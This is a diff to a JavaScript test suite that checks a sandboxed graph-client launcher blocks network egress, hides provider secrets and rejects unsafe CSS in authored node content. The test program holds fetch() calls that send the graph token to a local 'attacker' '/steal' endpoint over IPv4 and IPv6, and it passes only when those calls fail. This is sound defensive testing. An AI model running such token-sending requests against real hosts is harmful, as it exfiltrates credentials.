@@ -2008,8 +2008,15 @@ describe("evidence capture integrity", () => {
     const launcher = join(directory, "graph-authoring-launcher");
     const networkProfile = join(directory, "graph-authoring-network.sb");
     let attackerRequests = 0;
+    const diagnostics = [];
     let ipv6AttackerRequests = 0;
-    const server = createServer((request, response) => {
+    const server = createServer(async (request, response) => {
+      if (request.url === "/api/graph/authoring-errors" && request.headers.authorization === "Bearer graph-token") {
+        const chunks = []; for await (const chunk of request) chunks.push(chunk);
+        diagnostics.push(JSON.parse(Buffer.concat(chunks).toString("utf8")));
+        response.writeHead(202, { "content-type": "application/json" }).end(JSON.stringify({ recorded: true }));
+        return;
+      }
       if (request.url !== "/api/graph/nodes/1" || request.headers.authorization !== "Bearer graph-token") {
         response.writeHead(403).end(JSON.stringify({ error: { message: "bad capability" } }));
         return;
@@ -2043,9 +2050,14 @@ describe("evidence capture integrity", () => {
         ipv6AttackerServer.listen({ port: address.port, host: "::1", ipv6Only: true }, resolve);
       });
       const program = [
-        `const { RelayerGraphClient } = await import(${JSON.stringify(pathToFileURL(join(graphClientRoot, "agent-resource", "index.js")).href)});`,
+        `const { RelayerGraphClient, NodeObject, html, css } = await import(${JSON.stringify(pathToFileURL(join(graphClientRoot, "agent-resource", "index.js")).href)});`,
         'if (process.env.RELAYER_PROBE_SECRET !== undefined || process.env.OPENAI_API_KEY !== undefined) throw new Error("provider secret leaked");',
-        "const node = await RelayerGraphClient.fromEnv().getNode(1);",
+        "const graph = RelayerGraphClient.fromEnv();",
+        "const node = await graph.getNode(1);",
+        'const broken = new NodeObject("info", "Broken", "Private prose", "concept", "broken");',
+        'broken.detailAuthoring.setComponent("main", html`<p>Private prose</p>`, css`p { cursor: pointer; }`);',
+        'try { await graph.checkpointNodeDetail(broken); throw new Error("compiler accepted unsafe CSS"); } catch (error) { if (error.message === "compiler accepted unsafe CSS") throw error; }',
+        'await new Promise((resolve) => setTimeout(resolve, 100));',
         'if (node.id !== 1) throw new Error("graph client failed");',
         `try { await fetch("http://127.0.0.1:${attackerAddress.port}/steal", { headers: { authorization: process.env.RELAYER_GRAPH_TOKEN } }); throw new Error("egress escaped"); } catch (error) { if (error.message === "egress escaped") throw error; }`,
         `try { await fetch("http://[::1]:${address.port}/steal", { headers: { authorization: process.env.RELAYER_GRAPH_TOKEN } }); throw new Error("IPv6 egress escaped"); } catch (error) { if (error.message === "IPv6 egress escaped") throw error; }`,
@@ -2060,6 +2072,7 @@ describe("evidence capture integrity", () => {
             RELAYER_GRAPH_URL: `http://127.0.0.1:${address.port}`,
             RELAYER_GRAPH_TOKEN: "graph-token",
             RELAYER_NODE_ID: "1",
+            RELAYER_GRAPH_AUTHORING_ERRORS: "1",
           },
           stdio: ["pipe", "pipe", "pipe"],
         });
@@ -2074,8 +2087,9 @@ describe("evidence capture integrity", () => {
       expect(result, JSON.stringify(result)).toMatchObject({ status: 0 });
       expect(result.stderr).not.toContain("provider secret leaked");
       expect(result.stdout.trim().split(",").filter((name) => name !== "__CF_USER_TEXT_ENCODING")).toEqual([
-        "LANG", "LC_ALL", "RELAYER_GRAPH_TOKEN", "RELAYER_GRAPH_URL", "RELAYER_NODE_ID",
+        "LANG", "LC_ALL", "RELAYER_GRAPH_AUTHORING_ERRORS", "RELAYER_GRAPH_TOKEN", "RELAYER_GRAPH_URL", "RELAYER_NODE_ID",
       ]);
+      expect(diagnostics).toMatchObject([{ phase: "compiler", codes: ["unsafe_css"] }]);
       expect(attackerRequests).toBe(0);
       expect(ipv6AttackerRequests).toBe(0);
     } finally {
